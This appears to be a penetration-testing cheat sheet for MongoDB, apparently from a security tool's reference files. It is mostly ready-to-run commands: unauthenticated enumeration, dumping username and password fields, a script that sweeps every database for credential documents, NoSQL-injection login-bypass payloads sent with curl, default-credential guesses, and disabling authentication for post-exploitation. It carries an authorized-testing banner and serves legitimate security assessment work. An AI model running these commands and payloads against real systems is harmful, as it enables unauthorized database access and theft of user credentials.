---
service: mongodb
title: MongoDB
ports: 27017, 27018
aliases: mongo
---

# MongoDB — quick wins

**When you see it:** 27017/tcp open and `mongo --host H` drops you to a `>` prompt without
a password → unauthenticated, full read/write across all databases. Pre-2.6 deployments and
mis-configured cloud instances expose this constantly.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the target — get
> sign-off before modifying documents or config.

## Triage (read-only)
```sh
nmap -sV --script "mongo* and default" -p 27017 H   # version, databases, users
mongo --host H --eval "db.adminCommand({serverStatus:1})" --quiet | head -20
mongo --host H --eval "db.adminCommand('listDatabases')" --quiet
```

## Quick wins

### Enumerate databases and collections
```sh
mongo --host H
# inside the shell:
show dbs
use <DBNAME>
show collections
db.<COLLECTION>.count()
db.<COLLECTION>.find().limit(5).pretty()
```
*Why:* no credentials required on unauth instances; instantly reveals data layout and
volume. Look for collections named `users`, `accounts`, `sessions`, `tokens`, `config`.

### Dump credentials collection
```sh
mongo --host H <DBNAME> --eval \
  'db.<COLLECTION>.find({},{"username":1,"password":1,"email":1}).pretty()' --quiet
```
*Why:* MongoDB stores passwords as plaintext or weakly-hashed strings far more often than
SQL databases; a single collection dump often yields crackable hashes or cleartext.

### Search across all databases for password fields
```sh
mongo --host H --eval '
db.adminCommand("listDatabases").databases.forEach(function(d){
  var mdb = db.getSiblingDB(d.name);
  mdb.getCollectionNames().forEach(function(c){
    var r = mdb.getCollection(c).findOne({$or:[{password:{$exists:true}},{passwd:{$exists:true}},{pass:{$exists:true}}]});
    if(r) print(d.name+"."+c+": "+tojson(r));
  });
});' --quiet
```
*Why:* single sweep finds credential documents without knowing collection names in advance.

### NoSQLi auth bypass (web app, not direct Mongo)
```sh
# POST body — operator injection bypasses equality check
curl -s -X POST http://H/login \
  -d 'username=admin&password[$ne]=x'

# JSON body
curl -s -X POST http://H/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":"x"}}'
```
*Why:* applications that pass request parameters directly into `find()` queries are
vulnerable to operator injection. `$ne`, `$gt`, `$regex` are the most useful operators.
Works against the web layer, not the Mongo port directly.

### noauth config modification ✏️
```sh
# If you have shell access and root, disable auth entirely:
# Edit /etc/mongod.conf: set security.authorization: disabled (or add --noauth flag)
# Then restart: systemctl restart mongod
```
*Why:* bypasses auth for local post-exploitation lateral movement; leave `authorization:
enabled` (restore backup before leaving).

## aranum helpers
- `enum-mongo.sh` — the dispatcher that produced the finding (version, auth check, db list).

## Gotchas
- MongoDB 3.6+ binds to `127.0.0.1` by default; remote exposure means `bindIpAll: true` or
  an explicit `bindIp` was set — confirm with nmap before assuming it's reachable.
- `db.auth()` error on `admin` = authentication required; try blank password and common
  defaults (`admin:admin`, `root:root`, `mongo:mongo`) before giving up.
- `--authenticationDatabase admin` required for admin-level commands when creds are known.
- ObjectId timestamp leakage: the first 4 bytes of any `_id` are a Unix timestamp — useful
  for timing-based enumeration of object creation.
- Replica sets: connect to the PRIMARY for writes; secondaries reject writes by default.

## Sources
- HackTricks `27017-27018-mongodb` (ivanversluis/pentest-hacktricks mirror);
  PayloadsAllTheThings NoSQL Injection; mongo-objectid-predict (andresriancho/GitHub).
